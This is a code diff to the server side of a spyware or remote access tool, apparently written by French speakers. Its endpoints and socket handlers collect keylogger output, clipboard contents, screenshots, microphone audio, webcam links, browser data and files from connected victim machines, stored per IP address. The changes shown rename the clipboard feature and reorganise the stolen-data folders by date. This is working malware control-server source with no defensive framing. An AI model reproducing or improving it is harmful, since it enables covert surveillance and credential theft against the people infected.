@@ -50,7 +50,7 @@ microphone_ns = api.namespace('api/v1/microphone', description='Microphone opera
 browser_ns = api.namespace('api/v1/browser', description='Browser data operations')
 keylogger_ns = api.namespace('api/v1/keylogger', description='Keylogger operations')
 webcam_ns = api.namespace('api/v1/webcam', description='Webcam operations')
-papier_ns = api.namespace('api/v1/papier', description='Papier operations')
+clipboard_ns = api.namespace('api/v1/clipboard', description='Clipboard operations')
 download_file_ns = api.namespace('api/v1/download', description='Download file operations')
 directory_ns = api.namespace('api/v1/directory', description='Directory operations')
 
@@ -90,10 +90,10 @@ keylogger_model = api.model('Keylogger', {
     'file_path': fields.String(required=True, description='Chemin du fichier du keylogger'),
     'date_created': fields.String(required=True, description='Date de création du keylogger')
 })
-papier_model = api.model('Papier', {
-    'id': fields.Integer(required=True, description='ID du papier'),
-    'file_path': fields.String(required=True, description='Chemin du fichier du papier'),
-    'date_created': fields.String(required=True, description='Date de création du papier')
+clipboard_model = api.model('Clipboard', {
+    'id': fields.Integer(required=True, description='ID du clipboard'),
+    'file_path': fields.String(required=True, description='Chemin d\'accès du fichier du clipboard'),
+    'date_created': fields.String(required=True, description='Date de création du clipboard')
 })
 download_file_model = api.model('DownloadFile', {
     'id': fields.Integer(required=True, description='ID du fichier'),
@@ -325,28 +325,28 @@ class GetKeyloggerLog(Resource):
             return {'status': 'error', 'message': 'Fichier du keylogger non trouvé.'}, 404
 
 
-@papier_ns.route('/client/<int:client_id>')
-class GetPapiersByClientId(Resource):
+@clipboard_ns.route('/client/<int:client_id>')
+class GetClipboardsByClientId(Resource):
     @jwt_required()
     @api.doc(security='bearer_auth')
-    @papier_ns.marshal_with(papier_model, as_list=True)
+    @clipboard_ns.marshal_with(clipboard_model, as_list=True)
     def get(self, client_id):
-        papiers = Command.query.filter_by(client_id=client_id, type=CommandType.PAPIER).all()
-        for papier in papiers:
-            papier.date_created = papier.date_created.strftime('%d/%m/%Y à %H:%M:%S')
-        return papiers, 200
+        clipboards = Command.query.filter_by(client_id=client_id, type=CommandType.CLIPBOARD).all()
+        for clipboard in clipboards:
+            clipboard.date_created = clipboard.date_created.strftime('%d/%m/%Y à %H:%M:%S')
+        return clipboards, 200
 
 
-@papier_ns.route('/papier/<int:papier_id>')
-class GetPapierFile(Resource):
+@clipboard_ns.route('/content/<int:clipboard_id>')
+class GetClipboardFile(Resource):
     @jwt_required()
     @api.doc(security='bearer_auth')
-    def get(self, papier_id):
-        papier = Command.query.get(papier_id)
-        if papier and os.path.exists(papier.file_path):
-            return send_file(papier.file_path, mimetype='text/plain')
+    def get(self, clipboard_id):
+        clipboard = Command.query.get(clipboard_id)
+        if clipboard and os.path.exists(clipboard.file_path):
+            return send_file(clipboard.file_path, mimetype='text/plain')
         else:
-            return {'status': 'error', 'message': 'Fichier du papier non trouvé.'}, 404
+            return {'status': 'error', 'message': 'Fichier du clipboard non trouvé.'}, 404
 
 
 @webcam_ns.route('/link/<int:client_id>')
@@ -477,9 +477,9 @@ def handle_screenshot(data):
     client = Client.query.filter_by(sid=sid).first()
     if client:
         client_ip = client.ip
-        screenshot_dir = f"screenshots/{client_ip}"
+        screenshot_dir = f"screenshots/{client_ip}/{datetime.now().strftime('%Y-%m-%d')}"
         os.makedirs(screenshot_dir, exist_ok=True)
-        file_name = f"{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png"
+        file_name = f"{datetime.now().strftime('%H-%M-%S')}.png"
         screenshot_path = f"{screenshot_dir}/{file_name}"
         with open(screenshot_path, 'wb') as f:
             f.write(screenshot_bytes)
@@ -496,9 +496,9 @@ def handle_audio(data):
     client = Client.query.filter_by(sid=sid).first()
     if client:
         client_ip = client.ip
-        audio_dir = f"audio/{client_ip}"
+        audio_dir = f"audio/{client_ip}/{datetime.now().strftime('%Y-%m-%d')}"
         os.makedirs(audio_dir, exist_ok=True)
-        file_name = f"{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.wav"
+        file_name = f"{datetime.now().strftime('%H-%M-%S')}.wav"
         audio_path = f"{audio_dir}/{file_name}"
         with open(audio_path, 'wb') as f:
             f.write(audio_bytes)
@@ -537,9 +537,9 @@ def handle_keyboard(data):
     sid = request.sid
     client = Client.query.filter_by(sid=sid).first()
     if client:
-        keylogger_dir = f"keyloggers/{client.ip}"
+        keylogger_dir = f"keyloggers/{client.ip}/{datetime.now().strftime('%Y-%m-%d')}"
         os.makedirs(keylogger_dir, exist_ok=True)
-        file_name = f"{datetime.now().strftime('%Y-%m-%d_%H')}.txt"
+        file_name = f"{datetime.now().strftime('%H')}.txt"
         keylogger_path = f"{keylogger_dir}/{file_name}"
         with open(keylogger_path, 'a', encoding='utf-8') as f:
             for key in data.get('keyboard_log'):
@@ -561,13 +561,13 @@ def handle_clipboard(data):
     sid = request.sid
     client = Client.query.filter_by(sid=sid).first()
     if client:
-        clipboard_dir = f"clipboards/{client.ip}"
+        clipboard_dir = f"clipboards/{client.ip}/{datetime.now().strftime('%Y-%m-%d')}"
         os.makedirs(clipboard_dir, exist_ok=True)
-        file_name = f"{datetime.now().strftime('%Y-%m-%d_%H')}.txt"
+        file_name = f"{datetime.now().strftime('%H')}.txt"
         clipboard_path = f"{clipboard_dir}/{file_name}"
         with open(clipboard_path, 'a', encoding='utf-8') as f:
             f.write(data.get('clipboard_content'))
-        new_command = Command(type=CommandType.PAPIER, client_id=client.id, file_path=clipboard_path)
+        new_command = Command(type=CommandType.CLIPBOARD, client_id=client.id, file_path=clipboard_path)
         if db.session.query(Command).filter_by(file_path=clipboard_path).count() > 0:
             update_command = Command.query.filter_by(file_path=clipboard_path).first()
             update_command.date_created = datetime.now()
@@ -575,7 +575,7 @@ def handle_clipboard(data):
         else:
             db.session.add(new_command)
             db.session.commit()
-        app.logger.info(f"Contenu du presse-papiers reçu de {client.ip} et enregistré sous {clipboard_path}")
+        app.logger.info(f"Contenu du clipboard reçu de {client.ip} et enregistré sous {clipboard_path}")
 
 
 @socketio.on('webcam_response')
